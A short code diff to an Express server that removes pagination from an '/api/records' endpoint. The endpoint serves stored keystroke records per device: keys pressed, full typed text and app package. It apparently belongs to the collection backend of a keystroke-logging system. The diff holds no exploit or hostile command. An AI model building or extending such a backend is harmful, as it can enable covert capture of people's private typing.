@@ -100,9 +100,7 @@ app.get("/api/devices", async (_req, res) => {
 
 app.get("/api/records", async (req, res) => {
   try {
-    const pageSize = Math.min(parseInt(req.query.limit, 10) || 100, 500);
-    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
-    const skip = (page - 1) * pageSize;
+    const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
     const filter = {};
 
     if (req.query.deviceUniqueId) {
@@ -112,8 +110,7 @@ app.get("/api/records", async (req, res) => {
     const [records, total] = await Promise.all([
       KeystrokeRecord.find(filter)
         .sort({ createdAt: -1 })
-        .skip(skip)
-        .limit(pageSize)
+        .limit(limit)
         .select("recordId deviceUniqueId keyPressed fullText appPackage action createdAt"),
       KeystrokeRecord.countDocuments(filter),
     ]);
@@ -121,8 +118,6 @@ app.get("/api/records", async (req, res) => {
     res.json({
       success: true,
       total,
-      page,
-      pageSize,
       count: records.length,
       data: records,
     });
